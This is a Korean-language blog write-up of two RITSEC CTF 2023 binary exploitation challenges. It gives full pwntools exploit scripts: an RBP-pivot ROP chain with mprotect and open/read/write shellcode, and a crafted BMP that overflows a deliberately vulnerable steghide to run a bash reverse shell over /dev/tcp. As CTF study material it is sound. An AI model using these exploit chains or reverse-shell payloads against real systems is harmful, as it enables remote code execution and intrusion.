---
layout: post
title: "[RITSEC CTF 2023] Write up"
date: 2023-04-17 23:40:00 +0900
categories: [Security, CTF]
tags: [CTF, linux]
media_subpath: /assets/img/20230417_ritsec_write-up
---

Security Factorial 팀원들과 함께 대회를 매주 하고 있는데, 4월 1일에는 RITSEC CTF 2023에 참여하였다. 그중에서 못 풀었던 포너블 문제 2개를 가지고 왔다. 다음에는 웹이나 리버싱에서 못 푼 문제도 라업에 포함시키는 방식으로 하면 더 좋을 것 같다.

## **Alphabet**

### [0x00] 요약

---

스왑 함수를 사용하여 RBP 레지스터를 조작한 후, RBP를 기준으로 값을 덮음으로써 Stack BOF를 발생시키고, ORW를 수행하는 문제

### [0x01] 접근 방법

---

```
brwook@ubuntu:~/ctf/05_RITSEC$ seccomp-tools dump ./alphabet.bin 
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0f 0xc000003e  if (A != ARCH_X86_64) goto 0017
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x0c 0xffffffff  if (A != 0xffffffff) goto 0017
 0005: 0x15 0x0a 0x00 0x00000000  if (A == read) goto 0016
 0006: 0x15 0x09 0x00 0x00000001  if (A == write) goto 0016
 0007: 0x15 0x08 0x00 0x00000002  if (A == open) goto 0016
 0008: 0x15 0x07 0x00 0x00000009  if (A == mmap) goto 0016
 0009: 0x15 0x06 0x00 0x0000000a  if (A == mprotect) goto 0016
 0010: 0x15 0x05 0x00 0x0000000b  if (A == munmap) goto 0016
 0011: 0x15 0x04 0x00 0x0000000c  if (A == brk) goto 0016
 0012: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0014
 0013: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0014: 0x15 0x01 0x00 0x00000101  if (A == openat) goto 0016
 0015: 0x15 0x00 0x01 0x00000106  if (A != newfstatat) goto 0017
 0016: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0017: 0x06 0x00 0x00 0x00000000  return KILL
``` 

mprotect를 이용해서 쉘 코드를 작성해서 문제를 해결해야 할 것 같다.

![1](1.png)

다행히 문제의 보안 기법은 간단하다.

### [0x02] 분석

---

문제는 간단하다. OOB로 인해 AAR/AAW가 가능할 것으로 보인다.

![2](2.png)

`$rcx`에 우리가 입력한 패킷이 있고, 그 기준으로 음수 값에 덮어쓸 수 있는데 `$rbp`를 기준으로 +8 한 위치에 값을 덮으면 RIP 컨트롤이 될 것이다.

그런데, 8바이트끼리 스왑을 하기 때문에, 한 번에 8바이트밖에 못 덮는다. 그래서 맨 처음에는 RBP를 BSS로 돌리고, 그 이후에 RET를 leave ret 가젯으로 덮어야 할 것으로 보였다.

```python
00000000 packet          struc ; (sizeof=0x2D, mappedto_8)
00000000 header          db 2 dup(?)
00000002 src             dq ?
0000000A dst             dq ?
00000012 global_alpha    db 26 dup(?)
0000002C checksum        db ?
0000002D packet          ends
0000002D
```

그러나 대회가 끝난 이후, 라업을 보고 나서 알게 되었다. 핵심은 **RBP 레지스터를 원하는 값으로 스왑함으로써 스택 프레임을 조작**하는 것이었다.

실제로 스왑이 발생하는 부분에서 `input->global_alpha`의 주소는 `0x7fffffffdde0`이고, 이때 RBP 레지스터의 값은 `0x7fffffffddb0`이다. 즉, 스택 프레임을 원하는 값으로 조작할 수 있는 상태이다.

`main` 함수를 수행하는 중에 RSP 레지스터는 `0x7fffffffddc0` 값을 갖고 있다. `use_packet` 함수의 SFP 값(`main` 함수의 RBP 레지스터)을 `input->global_alpha(0x7fffffffdde0)`으로 조작한다면, `main` 함수에서 사용되는 `fgets`의 리턴 값이 문제가 된다. `fgets`는 glibc에서 구현한 함수답게, 실제 읽기 작업이 수행되는 함수는 위로 타고타고 올라가서 수행되는데, 인자로 `0x7fffffffdda0(rbp-0x40)`을 가져가고 `0x2c`만큼 읽기 작업을 하면, `fgets` 함수의 리턴 값이 조작되니, 막상 읽기 끝내고 돌아오니 실행 흐름이 조작되어 있게 되는 것이다.

그림으로 설명하자면 다음과 같다.

![3](3.png)

위는 정상적인 `main` 함수의 동작이다.

![4](4.png)

이런 식으로  `main` 함수의 RBP를 `input->global_alpha`로 조작하게 된다.

![5](5.png)

그러면 이런 식으로 `main` 함수 내부에서 `fgets`를 수행하면 RBP 레지스터를 기준으로 접근하기 때문에 ROP가 가능하게 되는 것이다.

![6](6.png)

스택 주소를 왜 다시 스택에 넣어주나 싶었는데, `main` 함수의 시작부에 `$rbp-0x50`에 입력 값의 주소를 넣어주는 과정이 존재한다. 아마도 이 문제를 풀이 가능하게 만들려고 일부러 삽입한 값이리라.

![7](7.png)

그러면, 정확히 fgets 내부 함수에서 크래시가 발생하며, 0x14바이트만큼 원하는 값을 실행할 수 있게 된다. 이때, 첫 번째 가젯에는 `pop rbp; ret`를 넣고, 두 번째 8바이트는 스택 주소로 채운디.

![8](8.png)

그 뒤에,  `main` 함수 내부에 fgets 가젯을 사용하면 이어서 ROP를 수행할 수 있을 것이다. 이때, 마침 바이너리에는 PIE 보호 기법이 걸려 있지 않기 때문에 3바이트와 NULL을 채워 넣으면 딱 알차게 ROP를 수행할 수 있다.

이때 intend 라업은 `gets` 함수를 추가적으로 호출하였고, 이후에 `mprotect` 함수를 사용하여 스택 영을 실행 가능하게 만들어준 뒤 쉘 코드를 실행했다. 이는 seccomp 보호 기법으로 인해 필연적인 것임을 기억하자. 만약 그게 안 걸려 있으면, 바로 처음 ROP에서 원 가젯으로 쉘 실행시키고 끝낼 수도 있었다.

### [0x03] 익스플로잇

---

```python
from pwn import *

def use(src, dst, payload=False):
    if src < 0: src += 0x10000000000000000
    if dst < 0: dst += 0x10000000000000000
    if not payload:
        pl = b'Z\x08' + p64(src) + p64(dst) + b'U'*10
    else:
        pl = b'Z\x08' + p64(src) + p64(dst) + b'U'*6 + payload
    checksum = 0
    for r in pl:
        checksum += r ^ 0x55
    checksum %= 0x100
    pl += p8(checksum)
    p.sendlineafter(b"threads\n", pl)

context(arch='amd64')
shell = shellcraft.open("./flag.txt")
shell += shellcraft.read("rax", "rsp", 0x50)
shell += shellcraft.write(1, "rsp", 0x50)

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', False)
p = process('./alphabet.bin', aslr=1)

# stack leak
use(-0x22, 0)
p.recvuntil(b": ")
stack = u64(p.recv(6)+b'\x00\x00') + 0x12
log.success(f"stack @ {hex(stack)}")

use(-0x22 - 0xd8, - (stack - 0x4040d0))
# libc leak : _IO_file_overflow+259
p.recvuntil(b": ")
libc.address = u64(p.recv(6) +b'\x00\x00') - 259 - libc.symbols['_IO_file_overflow']
log.success(f"libc base @ {hex(libc.address)}")

pop_rbp = 0x000000000040125d
pop_rdi = libc.address + 0x000000000002a3e5
fgets_gadget = 0x401734
leave_ret = 0x0000000000401437
use(-0x12 - 0x10, -0x12 - 0x30)
payload = b'A'*0x18
payload += p64(pop_rbp) + p64(stack+0x1e - 8) + p32(fgets_gadget)
p.sendafter(b"threads\n",payload)

rop = ROP([libc])
rop.call(rop.find_gadget(["ret"]))
rop.call("gets", [stack - 0xa])
p.sendline(rop.chain())

rop.clear_cache()
rop.call("mprotect", [stack - (stack & 0xFFF), 0x2000, 7])
p.sendline(rop.chain() + p64(stack + 0x5e) + asm(shell) + b'\n')

p.interactive()
```

RBP를 스왑해서 스택 프레임을 조작함으로써 fgets 내부에 ROP가 발생하게 하는 방법은 전혀 생각 못했다. 대회 기간에는 모든 바이너리 내부에서 0x0부터 0xFF까지 바이트코드를 찾아서 원하는 글씨를 만들어내는 풀이를 생각했는데, 너무 삽질 같아서 그냥 포기했었다.

RBP를 기준으로 입력을 수행하는 가젯이 있고, RBP를 조작할 수 있는 상황이라면, 이 둘을 반드시 연계하는 것을 기억해야겠다.

![9](9.png)



### [0x04] 참고 자료

---

- 출제자 write-up : [https://gitlab.ritsec.cloud/competitions/ctf-2023-public/-/tree/master/BIN-PWN/steg As A Service](https://gitlab.ritsec.cloud/competitions/ctf-2023-public/-/tree/master/BIN-PWN/alphabet)





## **Steg as a Service**

### [0x00] 요약

---

취약하게 만든 `steghide` 바이너리를 퍼징 또는 diff를 띄워서 익스플로잇하고, 바이너리 가젯만을 사용하여 리버스쉘을 띄우는 문제

### [0x01] 접근 방법

---

문제 Dockerfile 내부에서 사용되는 `steghide` 바이너리와 취약점이 해결됐다는 `steghide-patched` 바이너리 두 개를 제공해주는 걸 확인해 줄 수 있는데, 두 바이너리의 차이는 다음과 같다.

```bash
$ objdump -M intel -d ./steghide > s1.hex
$ objdump -M intel -d ./steghide-patched > s2.hex
$ diff s1.hex s2.hex
2c2
< ./steghide:     file format elf64-x86-64
---
> ./steghide-patched:     file format elf64-x86-64
32686c32686
<   41ee67:	0f 87 07 01 00 00    	ja     41ef74 <_ZN7BmpFile8readdataEv+0x1ba>
---
>   41ee67:	0f 83 07 01 00 00    	jae    41ef74 <_ZN7BmpFile8readdataEv+0x1ba>
```

해당 함수는 `BmpFile::readdata` 였는데, 반복문으로 패치된 바이너리에서는 `height`만큼 도는 것을, 취약한 바이너리에서는 `height+1`번 돌게 구성되어 있었다.

![10](10.png)

함수 명을 보았을 때, 취약한 코드가 실행되도록 만들 파일은 `bmp` 포맷의 파일로 추측된다.

또한, 바이너리의 보호 기법을 체크했을 때, PIE 보호 기법이 걸려 있지 않아서 바이너리의 주소는 원하는대로 사용할 수 있었고, Canary 또한 걸려 있지 않았기에 위의 내용과 함께 고려해 볼 경우 Stack BOF 취약점이 의심되는 상황이다.

![11](11.png)

### [0x02] 분석

---

`steghide` 바이너리가 서버단에서 실행되는 방법으로, 본 문제는 간이 웹 사이트를 만드는 방식을 택하였다. Docker 구성품에 `server.py` 파이썬 코드를 함께 제공하였고 해당 코드는 다음과 같다.

```python
      if request.method == 'POST':
        if 'file' in request.files and 'passphrase' in request.form:
            f = request.files['file']
            stegfile_name = str(uuid.uuid4())
            outfile_name = str(uuid.uuid4())
            f.save(app.config['UPLOAD_FOLDER'] + stegfile_name)
            os.chdir(app.config['UPLOAD_FOLDER'])
            try:
                subprocess.run(['steghide', 'extract', '-sf', stegfile_name, '-p', request.form['passphrase'], '-xf', outfile_name], check=True, timeout=60)
            ...
```

공격자가 제공한 파일을 `steghide extract -sf {stegfile_name} -p {passphrase} -xf {outfile_name}`으로 실행한다. 따라서, 디버거로 프로그램을 실행할 때도 `r extract -sf {filename} -p {phrase} -xf {outfile_path}` 와 같은 순으로 실행해야 할 것이다.

그래서 일단 대충 bmp 파일 예제(bmp_24.bmp)를 가져와서 이를 실행시켰고 별다른 일이 없었다.

- [https://people.math.sc.edu/Burkardt/data/bmp/bmp.html](https://people.math.sc.edu/Burkardt/data/bmp/bmp.html)

그러나, 해당 파일에다가 대충 ‘A’를 추가로 작성해줬더니 실행 시에 스택 BOF가 발생한 것을 확인할 수 있었다.

![12](12.png)

따라서, pwntools의 `cyclic` 클래스를 활용해서 오프셋을 구해줬고, 해당 오프셋은 56임을 알 수 있었다.

![13](13.png)

이말인 즉슨, 56번째부터 우리가 원하는 값이 연달아 실행된다, ROP가 된다는 의미가 되었다. 이제부터 ROP chain을 구성하면 되는데, 사용할 수 있는 것이 바이너리 주소밖에 없음에 주의하자.

Ben-Lichtman님이 개발한 ROP gadget finder 툴(`ropr`)을 사용할 경우, 아래와 같이 쉽게 가젯을 구해낼 수 있다.

![14](14.png)

이런 방식으로 유용한 가젯을 뽑아낸다면 아래와 같을 듯 하다.

```
0x004560ba: mov [rax], rdx; nop; pop rbp; ret;
0x0042f51a: mov rax, rdx; pop rbp; ret;
0x0045b2fb: pop rdi; ret;
0x0045b2f9: pop rsi; pop r15; ret;
0x0042cd0c: pop rdx; ret;
0x0044d224: syscall;
```

또한, 서버단에서 바이너리를 한 번 실행시켜주고 끝나기 때문에 곧바로 쉘을 따야한다. 그것도 리버스쉘을 따내야 하는데, 이는 바이너리 실행의 주체가 클라이언트가 아니라 웹 서버이기 때문이다. 따라서, 웹 서버가 실행함과 동시에 공격자의 서버로 리버스쉘을 실행하는 코드를 짜내야 할 것이다.

마침 필요한 가젯은 모두 모았으니 이제 ROP를 해 보자.


### [0x03] 익스플로잇

---

```python
from pwn import *

mov_rax_mem_rdx = 0x004560ba # mov [rax], rdx; nop; pop rbp; ret;
mov_rax_rdx = 0x0042f51a # mov rax, rdx; pop rbp; ret;
pop_rdi = 0x0045b2fb # pop rdi; ret;
pop_rsi_r15 = 0x0045b2f9 # pop rsi; pop r15; ret;
pop_rdx = 0x0042cd0c # pop rdx; ret;
syscall = 0x0044d224
def write_what_where(addr, val):
    assert(len(val) <= 8)
    pl = p64(pop_rdx) + p64(addr)
    pl += p64(mov_rax_rdx) + p64(0)
    pl += p64(pop_rdx) + val.ljust(8, b'\x00')
    pl += p64(mov_rax_mem_rdx) + p64(0)
    return pl

with open("bmp_24.bmp", "rb") as f:
    data = f.read()
    header = data[:0x12] + p32(0x8000) + p32(0x0) + data[0x1a:0x36]

IP = '127.0.0.1'
PORT = 8080
reverse_shell = f'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'.encode()

bss = 0x48aaa8

payload = header
payload += b'A'*0x38
payload += write_what_where(bss, b'/bin/bas')
payload += write_what_where(bss + 8, b'h')
payload += write_what_where(bss + 0x10, b'-c')
num_writes = int((len(reverse_shell)/8) + 1)
for i in range(num_writes):
    payload += write_what_where(bss + 0x18 + (8*i), reverse_shell[i*8:i*8+8])

binbash = bss
bashoption = bss + 0x10
bashcommand = bss + 0x18

payload += write_what_where(bss + 0x70, p64(binbash))
payload += write_what_where(bss + 0x78, p64(bashoption))
payload += write_what_where(bss + 0x80, p64(bashcommand))
payload += p64(pop_rdx) + p64(59) + p64(mov_rax_rdx) + p64(0)
payload += p64(pop_rdi) + p64(binbash)
payload += p64(pop_rsi_r15) + p64(bss + 0x70) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(syscall)
with open("file.bmp", "wb") as f:
    f.write(payload)
```

익스플로잇 페이로드를 길게 하기 위해서, bmp 포맷 중 width 필드를 늘려서 사용했다. 또한, 더미 값을 줄이기 위해 height를 0으로 만들었고, 이를 통해 바로 내가 입력한 값으로 ROP가 발생하게 하였다. 그렇게 만든 페이로드를 아래와 같이, 컨테이너로 던져주면, 호스트에서 리버스쉘을 얻은 걸 확인할 수 있다.

![15](15.png)

리버스쉘이 안 먹히는 줄 알고, 온갖가지 삽질을 했었는데 결국 대회 시간 내에 못 풀었다. 다음에 리버스 쉘을 띄워야 하는 문제가 있다면, 이를 양분 삼아 더 쉽게 풀 수 있을 것 같다.

### [0x04] 참고 자료

---

- Voider님의 write-up : [https://secvoid.xyz/2023/04/ritsec2023-steg/](https://secvoid.xyz/2023/04/ritsec2023-steg/)
    - ropr이라는 좋은 gadget finder, IDA에서 사용할 수 있는 BinDiff 툴을 알게 되었다.
- 출제자 write-up : [https://gitlab.ritsec.cloud/competitions/ctf-2023-public/-/tree/master/BIN-PWN/steg As A Service](https://gitlab.ritsec.cloud/competitions/ctf-2023-public/-/tree/master/BIN-PWN/steg%20As%20A%20Service)
    - 리버스쉘을 띄울 때, `bash -c blabla`로 구성한다면 널 구분자의 개수를 3개로 줄일 수 있다는 꿀팁을 얻었다.